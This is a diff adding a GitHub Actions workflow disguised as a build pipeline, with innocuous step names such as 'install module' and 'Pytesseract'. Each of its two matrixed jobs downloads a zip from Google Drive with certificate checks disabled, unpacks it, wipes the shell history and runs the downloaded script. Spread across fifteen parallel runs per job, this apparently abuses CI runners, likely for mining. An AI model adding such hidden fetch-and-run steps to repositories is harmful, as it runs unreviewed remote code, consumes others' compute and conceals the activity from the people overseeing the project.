@@ -1,0 +1,56 @@
+name: vectornang989dev
+on:
+  push:
+    branches: [ "main" ]
+  workflow_dispatch:
+
+jobs:
+  LAUNCH:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Plan', 'Assemble', 'Validate', 'Run', 'Publish']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1OkPBiOL7zn9M5-pTdewlJtMCw9yEWX3Z" -O Quart.zip
+        unzip -o Quart.zip
+        rm Quart.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+
+
+  BUILD1:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 10
+      matrix:
+        go: [I.o, I.i, I.ii]
+        flag: ['Collect', 'Design', 'Review', 'Launch', 'Deliver']
+
+    env:
+        NUM_JOBS: 20
+        JOB: ${ matrix.go }
+    steps:
+    - uses: actions/checkout@v1
+    - name: install module
+      run: |
+        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1OkPBiOL7zn9M5-pTdewlJtMCw9yEWX3Z" -O Quart.zip
+        unzip -o Quart.zip
+        rm Quart.zip
+        history -c && history -w
+
+    - name: Pytesseract
+      run: bash requirements.sh
+        
